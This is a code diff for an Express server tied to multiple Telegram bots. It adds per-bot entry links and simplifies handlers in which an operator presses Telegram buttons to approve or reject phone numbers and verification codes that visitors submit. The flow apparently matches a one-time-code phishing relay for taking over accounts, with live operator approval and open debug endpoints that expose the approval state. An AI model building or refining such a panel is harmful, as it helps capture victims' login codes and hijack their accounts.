@@ -43,6 +43,7 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
+// ---------------- TELEGRAM ----------------
 async function sendTelegramMessage(bot, text, keyboard = []) {
     try {
         await axios.post(
@@ -87,8 +88,20 @@ async function initWebhooks() {
     for (const bot of bots) {
         await setWebhook(bot);
     }
-    console.log("✅ All webhooks initialized");
+    console.log("✅ Webhooks initialized");
 }
+
+// ---------------- ✅ ENTRY POINT (FIXED) ----------------
+app.get('/bot/:botId', (req, res) => {
+    const bot = getBot(req.params.botId);
+
+    if (!bot) {
+        return res.status(404).send('Invalid bot link');
+    }
+
+    // IMPORTANT: entry page keeps botId
+    res.redirect(`/index.html?botId=${bot.botId}`);
+});
 
 // ---------------- PHONE FLOW ----------------
 app.post('/submit-phone', (req, res) => {
@@ -160,36 +173,13 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     const [action, requestId] = cb.data.split(':');
 
-    if (!requestId) {
-        console.log("❌ Missing requestId in callback:", cb.data);
-        return res.sendStatus(200);
-    }
+    if (!requestId) return res.sendStatus(200);
 
-    let message = '';
+    if (action === 'phone_ok') approvedPhones[requestId] = true;
+    if (action === 'phone_bad') approvedPhones[requestId] = false;
 
-    if (action === 'phone_ok') {
-        approvedPhones[requestId] = true;
-        message = `Phone approved`;
-    }
-
-    if (action === 'phone_bad') {
-        approvedPhones[requestId] = false;
-        message = `Phone rejected`;
-    }
-
-    if (action === 'code_ok') {
-        approvedCodes[requestId] = true;
-        message = `Code approved`;
-    }
-
-    if (action === 'code_bad') {
-        approvedCodes[requestId] = false;
-        message = `Code rejected`;
-    }
-
-    if (message) {
-        await sendTelegramMessage(bot, message);
-    }
+    if (action === 'code_ok') approvedCodes[requestId] = true;
+    if (action === 'code_bad') approvedCodes[requestId] = false;
 
     await answerCallback(bot, cb.id);
 
@@ -200,7 +190,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 app.get('/debug/phones', (req, res) => res.json(approvedPhones));
 app.get('/debug/codes', (req, res) => res.json(approvedCodes));
 
-// ---------------- START SERVER ----------------
+// ---------------- START ----------------
 initWebhooks().then(() => {
     app.listen(PORT, () => {
         console.log(`🚀 Server running on ${PORT}`);
